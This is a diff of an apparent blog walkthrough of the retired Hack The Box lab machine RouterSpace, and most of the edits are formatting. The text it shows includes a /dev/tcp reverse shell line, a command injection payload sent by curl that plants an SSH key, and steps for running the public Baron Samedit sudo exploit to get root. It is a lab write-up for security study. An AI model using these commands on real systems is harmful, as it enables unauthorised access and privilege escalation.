-<p>The machine has an outbound firewall — it blocks connections from the target back to us. A classic bash reverse shell like <code>bash -i &gt;&amp; /dev/tcp/10.10.16.84/4444 0&gt;&amp;1</code> just hangs.</p>
-<p>This is common on HTB and real environments. <strong>When you can't get a shell back, pivot to writing files instead.</strong> We have RCE — we can read and write files on the server. That's enough to plant an SSH key.</p>
-<h3 id="hacker-mindset-5">Hacker mindset</h3>
+<p>The machine has an outbound firewall - it blocks connections from the target back to us. A classic bash reverse shell like <code>bash -i &gt;&amp; /dev/tcp/10.10.16.84/4444 0&gt;&amp;1</code> just hangs.</p>
+<p>This is common on HTB and real environments. <strong>When you can't get a shell back, pivot to writing files instead.</strong> We have RCE - we can read and write files on the server. That's enough to plant an SSH key.</p>
+
 <p>Firewalls block outbound. But the <em>server</em> can still accept inbound SSH connections on port 22 (that's what it's there for). Instead of making the server call us, we make ourselves able to log in as paul via SSH. Plant our public key → connect legitimately.</p>
-<hr />
-<h2 id="step-6-getting-a-shell-as-paul-a-name-step-6-a">Step 6 — Getting a Shell as paul <pre class="raw-markup-example"><code>&lt;a name="step-6"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
+<hr>
+<h2 id="step-6-getting-a-shell-as-paul">Step 6: Getting a Shell as paul</h2>
 <h3 id="how-ssh-key-authentication-works">How SSH key authentication works</h3>
 <p>SSH supports two login methods:</p>
 <ol>
-<li><strong>Password</strong> — you type a password</li>
-<li><strong>Key pair</strong> — you have a private key locally, and the server has your public key in <code>~/.ssh/authorized_keys</code></li>
+<li><strong>Password</strong> : you type a password</li>
+<li><strong>Key pair</strong> : you have a private key locally, and the server has your public key in <code>~/.ssh/authorized_keys</code></li>
 </ol>
 <p>If the server finds your public key in <code>authorized_keys</code>, it grants access without a password. We can <em>write</em> our public key there using our RCE.</p>
 <h3 id="generate-an-ssh-key-pair-on-kali">Generate an SSH key pair on Kali</h3>
 <pre><code class="language-bash" data-language="bash">ssh-keygen -t ed25519 -f /home/kali/.ssh/routerspace -N ""
 </code></pre>
 <ul>
-<li><code>-t ed25519</code> — modern, fast elliptic curve key type</li>
-<li><code>-f</code> — file path to save the key</li>
-<li><code>-N ""</code> — no passphrase (empty, for convenience)</li>
+<li><code>-t ed25519</code> : modern, fast elliptic curve key type</li>
+<li><code>-f</code> : file path to save the key</li>
+<li><code>-N ""</code> : no passphrase (empty, for convenience)</li>
 </ul>
 <p>This creates two files:</p>
 <ul>
-<li><code>/home/kali/.ssh/routerspace</code> — your <strong>private key</strong> (never share this)</li>
-<li><code>/home/kali/.ssh/routerspace.pub</code> — your <strong>public key</strong> (safe to share/plant)</li>
+<li><code>/home/kali/.ssh/routerspace</code> : your <strong>private key</strong> (never share this)</li>
+<li><code>/home/kali/.ssh/routerspace.pub</code> : your <strong>public key</strong> (safe to share/plant)</li>
 </ul>
 <h3 id="plant-the-public-key-via-rce">Plant the public key via RCE</h3>
 <pre><code class="language-bash" data-language="bash">curl -s \
   -H 'User-Agent: RouterSpaceAgent' \
   -H 'Content-Type: application/json' \
   -d "{\"ip\":\"0.0.0.0; mkdir -p /home/paul/.ssh &amp;&amp; echo '$(cat /home/kali/.ssh/routerspace.pub)' &gt;&gt; /home/paul/.ssh/authorized_keys\"}" \
-  http://routerspace.[redacted encoded lab material]
+  http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess
 </code></pre>
 <p>Breaking down the injected command:</p>
 <ul>
-<li><code>mkdir -p /home/paul/.ssh</code> — create the <code>.ssh</code> directory if it doesn't exist (<code>-p</code> suppresses errors if it already exists)</li>
-<li><code>&amp;&amp;</code> — only run the next command if the previous succeeded</li>
-<li><code>echo '&lt;pubkey&gt;' &gt;&gt; authorized_keys</code> — append our public key (<code>&gt;&gt;</code> appends, <code>&gt;</code> would overwrite)</li>
+<li><code>mkdir -p /home/paul/.ssh</code> : create the <code>.ssh</code> directory if it doesn't exist (<code>-p</code> suppresses errors if it already exists)</li>
+<li><code>&amp;&amp;</code> : only run the next command if the previous succeeded</li>
+<li><code>echo '&lt;pubkey&gt;' &gt;&gt; authorized_keys</code> : append our public key (<code>&gt;&gt;</code> appends, <code>&gt;</code> would overwrite)</li>
 </ul>
 <h3 id="connect-via-ssh">Connect via SSH</h3>
 <pre><code class="language-bash" data-language="bash">ssh -i /home/kali/.ssh/routerspace paul@routerspace.htb
 </code></pre>
 <p>You're in.</p>
-<h3 id="hacker-mindset-6">Hacker mindset</h3>
-<p>We went from "I can run commands" to "I have an interactive shell" by leveraging what we had access to. No fancy exploit — just logic: SSH exists, we can write files, keys allow passwordless SSH login. Chain the primitives together.</p>
-<hr />
-<h2 id="step-7-user-flag-a-name-step-7-a">Step 7 — User Flag <pre class="raw-markup-example"><code>&lt;a name="step-7"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
+
+<p>We went from "I can run commands" to "I have an interactive shell" by using what we had access to. No fancy exploit - just logic: SSH exists, we can write files, keys allow passwordless SSH login. Chain the primitives together.</p>
+<hr>
+<h2 id="step-7-user-flag">Step 7: User Flag</h2>
 <pre><code class="language-bash" data-language="bash">cat /home/paul/user.txt
 </code></pre>
 <pre><code>83531[redacted]735eda2222
 </code></pre>
-<hr />
-<h2 id="step-8-privilege-escalation-enumeration-a-name-step-8-a">Step 8 — Privilege Escalation Enumeration <pre class="raw-markup-example"><code>&lt;a name="step-8"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
+<hr>
+<h2 id="step-8-privilege-escalation-enumeration">Step 8: Privilege Escalation Enumeration</h2>
 <h3 id="the-goal">The goal</h3>
 <p>We're logged in as <code>paul</code> (a regular user). We need to become <code>root</code> to read <code>/root/root.txt</code>. This is called <strong>privilege escalation</strong>.</p>
 <h3 id="what-to-check-first">What to check first</h3>
-<p>Always start by checking the sudo version — it's a common escalation path:</p>
+<p>Always start by checking the sudo version - it's a common escalation path:</p>
 <pre><code class="language-bash" data-language="bash">sudo --version
 </code></pre>
 <p>Or use a quick vulnerability check from the CVE-2021-3156 advisory:</p>
@@ -212,29 +209,29 @@ f:["$","div","lab-archive-0",{"className":"article-review-note article-review-la
 <pre><code>[sudo] password for paul:
 </code></pre>
 <p><strong>Vulnerable.</strong></p>
-<h3 id="hacker-mindset-7">Hacker mindset</h3>
-<p>Before running automated tools like LinPEAS, do quick manual checks for known critical vulns first. CVE-2021-3156 was patched in January 2021 — machines released around or before that date are often still vulnerable. The <code>sudoedit -s Y</code> one-liner is a near-instant check. Fast wins first.</p>
-<hr />
-<h2 id="step-9-exploiting-cve-2021-3156-baron-samedit-a-name-step-9-a">Step 9 — Exploiting CVE-2021-3156 (Baron Samedit) <pre class="raw-markup-example"><code>&lt;a name="step-9"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
+
+<p>Before running automated tools like LinPEAS, do quick manual checks for known critical vulns first. CVE-2021-3156 was patched in January 2021 - machines released around or before that date are often still vulnerable. The <code>sudoedit -s Y</code> one-liner is a near-instant check. Fast wins first.</p>
+<hr>
+<h2 id="step-9-exploiting-cve-2021-3156-baron-samedit">Step 9: Exploiting CVE-2021-3156 (Baron Samedit)</h2>
 <h3 id="what-is-baron-samedit">What is Baron Samedit</h3>
 <p>CVE-2021-3156 is a <strong>heap-based buffer overflow</strong> in <code>sudo</code> discovered by Qualys in January 2021. It affects sudo versions 1.8.2 through 1.8.31p2 and 1.9.0 through 1.9.5p1.</p>
 <p>The vulnerability: when <code>sudoedit</code> is invoked with a trailing backslash in an argument, it incorrectly unescapes the argument, overflowing a heap buffer. Because <code>sudo</code> runs as root (it's a setuid binary), this overflow can be exploited to gain a root shell.</p>
-<p>You don't need to understand the heap exploitation internals — you just need to know:</p>
+<p>You don't need to understand the heap exploitation internals - you just need to know:</p>
 <ol>
 <li>It exists</li>
 <li>The target is vulnerable</li>
 <li>There's a public PoC</li>
 </ol>
-<h3 id="on-kali-download-the-exploit">On Kali — download the exploit</h3>
+<h3 id="on-kali-download-the-exploit">On Kali: download the exploit</h3>
 <pre><code class="language-bash" data-language="bash">cd /tmp
 wget https://codeload.github.com/blasty/CVE-2021-3156/zip/main -O CVE-2021-3156.zip
 unzip CVE-2021-3156.zip
 </code></pre>
 <h3 id="transfer-to-the-target">Transfer to the target</h3>
-<p>Because outbound connections are blocked, we use SCP (which goes <em>inbound</em> from Kali to the target over port 22 — allowed):</p>
+<p>Because outbound connections are blocked, we use SCP (which goes <em>inbound</em> from Kali to the target over port 22 - allowed):</p>
 <pre><code class="language-bash" data-language="bash">scp -i /home/kali/.ssh/routerspace -r /tmp/CVE-2021-3156-main paul@routerspace.htb:/tmp/
 </code></pre>
-<h3 id="on-the-target-compile-and-run">On the target — compile and run</h3>
+<h3 id="on-the-target-compile-and-run">On the target: compile and run</h3>
 <pre><code class="language-bash" data-language="bash">cd /tmp/CVE-2021-3156-main
 make
 ./sudo-hax-me-a-sandwich 1
@@ -251,35 +248,34 @@ uid=0(root) gid=0(root) groups=0(root),1001(paul)
 </code></pre>
 <h3 id="why-index-1-specifically">Why index 1 specifically</h3>
 <p>The exploit targets specific memory offsets that vary by sudo version and libc version. The PoC ships with a list of pre-computed targets. You identify which one matches by checking the OS and sudo version on the target (<code>lsb_release -a</code>, <code>sudo --version</code>). Ubuntu 20.04 with sudo 1.8.31 is index 1 in blasty's list.</p>
-<h3 id="hacker-mindset-8">Hacker mindset</h3>
-<p>Public PoCs exist for well-known CVEs. The skill isn't writing the exploit from scratch — it's: (1) identifying the vulnerability, (2) finding the right PoC, (3) matching the target profile correctly. Getting the target index wrong means a crash instead of a shell.</p>
-<hr />
-<h2 id="step-10-root-flag-a-name-step-10-a">Step 10 — Root Flag <pre class="raw-markup-example"><code>&lt;a name="step-10"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
+
+<p>Public PoCs exist for well-known CVEs. The skill isn't writing the exploit from scratch - it's: (1) identifying the vulnerability, (2) finding the right PoC, (3) matching the target profile correctly. Getting the target index wrong means a crash instead of a shell.</p>
+<hr>
+<h2 id="step-10-root-flag">Step 10: Root Flag</h2>
 <pre><code class="language-bash" data-language="bash">cat /root/root.txt
 </code></pre>
 <pre><code>49e6ee[redacted]537577942
 </code></pre>
-<hr />
-<h2 id="lessons-learned-a-name-lessons-a">Lessons Learned <pre class="raw-markup-example"><code>&lt;a name="lessons"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
+<hr>
+<h2 id="lessons-learned">Lessons Learned</h2>
 <h3 id="1-you-don-t-always-need-to-run-the-app">1. You don't always need to run the app</h3>
 <p>The APK was a red herring in terms of setup complexity. Static analysis (reading the decompiled source) gave us everything we needed. The "dynamic analysis with Android emulator" path works, but it's slow and painful. Always try the simple path first.</p>
-<h3 id="2-firewalls-don-t-stop-you-they-redirect-you">2. Firewalls don't stop you — they redirect you</h3>
+<h3 id="2-firewalls-don-t-stop-you-they-redirect-you">2. Firewalls don't stop you: they redirect you</h3>
 <p>An outbound firewall kills reverse shells. But if inbound SSH is open and you have file write, you still win. Think about what channels ARE available, not just the ones that are blocked.</p>
 <h3 id="3-check-sudo-version-early">3. Check sudo version early</h3>
-<p>Baron Samedit affected a huge number of systems. It's one of the first things worth checking on any Linux target from 2021 or earlier. A 5-second check (<code>sudoedit -s Y</code>) can save you hours of enumeration.</p>
+<p>Baron Samedit affected many of systems. It's one of the first things worth checking on any Linux target from 2021 or earlier. A 5-second check (<code>sudoedit -s Y</code>) can save you hours of enumeration.</p>
 <h3 id="4-chain-primitives">4. Chain primitives</h3>
 <ul>
 <li>RCE → file write → SSH key → interactive shell</li>
 <li>Interactive shell → version check → public exploit → root</li>
 </ul>
 <p>Neither jump was a single magic step. Each primitive enabled the next one. This chaining is the core skill of post-exploitation.</p>
-<h3 id="5-the-hacker-mindset-in-one-sentence">5. The hacker mindset in one sentence</h3>
-<p><strong>"What do I have, what can I do with it, and what does that unlock next?"</strong></p>
-<hr />
-<p><em>Machine: RouterSpace | Difficulty: Easy | OS: Linux | Category: Android / Command Injection / Known CVE</em></p>
-12:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$17"}}]
-13:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-retired-walkthrough","children":[["$","span",null,{"children":["Newer in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: Retired Walkthrough"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",120," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-scanned-walkthrough","children":[["$","span",null,{"children":["Older in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: Scanned Walkthrough"}]]}]}]]}]
-14:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Public research · scoped security testing"}],["$","$L2",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
-18:T543,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-routerspace-walkthrough/#article","headline":"Hack The Box: RouterSpace Walkthrough","description":"An archived walkthrough of the retired Hack The Box RouterSpace machine, preserved from Abdullah Kareem's OSWE Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-routerspace-walkthrough/","datePublished":"2026-06-11T11:43:57.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":1976,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/d65edaba54b381efb7f2e74e00a5ff93b9ce0249/HTB-RouterSpace.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-routerspace-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-routerspace-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: RouterSpace Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-routerspace-walkthrough/"}]}]}15:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$18"}}]
-16:["$","$L19",null,{"children":["$","$1a",null,{"name":"Next.MetadataOutlet","children":"$@1b"}]}]
-1b:null
+<h3 id="summary">Summary</h3>
+
+<hr>
+<p><em>Machine: RouterSpace | Difficulty: Easy | OS: Linux | Category: Android / Command Injection / Known CVE</em></p>10:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$15"}}]
+11:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-retired-walkthrough","children":[["$","span",null,{"children":["Newer in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: Retired Walkthrough"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",120," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-scanned-walkthrough","children":[["$","span",null,{"children":["Older in ","Hack The Box"]}],["$","strong",null,{"children":"Hack The Box: Scanned Walkthrough"}]]}]}]]}]
+12:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Public research · scoped security testing"}],["$","$L2",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
+16:T586,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-routerspace-walkthrough/#article","headline":"Hack The Box: RouterSpace Walkthrough","description":"Decompiling the RouterSpace APK exposed an API whose IP field was command-injectable, allowing Paul's SSH key to be planted before the vulnerable sudo version was exploited with Baron Samedit for root.","url":"https://cyberkareem.com/writing/hackthebox-routerspace-walkthrough/","datePublished":"2026-06-11T11:43:57.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":1861,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/d65edaba54b381efb7f2e74e00a5ff93b9ce0249/HTB-RouterSpace.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-routerspace-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-routerspace-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: RouterSpace Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-routerspace-walkthrough/"}]}]}13:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$16"}}]
+14:["$","$L17",null,{"children":["$","$18",null,{"name":"Next.MetadataOutlet","children":"$@19"}]}]
+19:null
